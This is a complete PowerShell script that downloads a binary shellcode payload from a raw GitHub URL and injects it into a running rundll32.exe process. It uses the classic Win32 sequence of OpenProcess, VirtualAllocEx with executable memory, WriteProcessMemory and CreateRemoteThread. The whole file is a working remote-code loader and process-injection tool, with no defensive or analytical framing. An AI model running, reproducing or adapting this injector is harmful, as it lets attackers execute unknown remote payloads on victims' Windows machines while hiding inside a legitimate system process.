# 1. Locate an instance of the target process (rundll32.exe)
$targetProcess = Get-Process -Name "rundll32" -ErrorAction SilentlyContinue | Select-Object -First 1
if (!$targetProcess) {
    Write-Host "Target process (rundll32.exe) not found." -ForegroundColor Red
    exit
}
$pid = $targetProcess.Id
Write-Host "Using rundll32.exe with PID $pid as target process."

# 2. Download the shellcode payload from the specified URL
$url = "https://raw.githubusercontent.com/Magturn/Bat/main/winner.bin"
$wc = New-Object System.Net.WebClient
Write-Host "Downloading shellcode payload from $url..."
$shellcode = $wc.DownloadData($url)
Write-Host "Downloaded shellcode of $($shellcode.Length) bytes."

# 3. Define necessary Win32 API functions using Add-Type
$signature = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
Add-Type $signature

# 4. Define constants for process access and memory allocation
$PROCESS_ALL_ACCESS    = 0x1F0FFF
$MEM_COMMIT            = 0x1000
$MEM_RESERVE           = 0x2000
$PAGE_EXECUTE_READWRITE= 0x40

# 5. Open the target process with necessary access rights
$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "Failed to open target process." -ForegroundColor Red
    exit
}
Write-Host "Target process opened successfully."

# 6. Allocate memory in the target process for the shellcode
$size = $shellcode.Length
$allocAddress = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_EXECUTE_READWRITE)
if ($allocAddress -eq [IntPtr]::Zero) {
    Write-Host "Memory allocation in target process failed." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host ("Allocated {0} bytes at address {1}" -f $size, $allocAddress)

# 7. Write the downloaded shellcode into the allocated memory
[int]$bytesWritten = 0
$result = [Win32]::WriteProcessMemory($hProcess, $allocAddress, $shellcode, $shellcode.Length, [ref]$bytesWritten)
if (-not $result -or $bytesWritten -ne $shellcode.Length) {
    Write-Host "Failed to write shellcode to target process memory." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host "Shellcode written successfully to target process memory."

# 8. Create a remote thread in the target process to execute the shellcode
$threadHandle = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($threadHandle -eq [IntPtr]::Zero) {
    Write-Host "Failed to create remote thread." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host "Remote thread created. Shellcode injected and executing!"

# 9. Clean up by closing the handle to the target process
[Win32]::CloseHandle($hProcess)
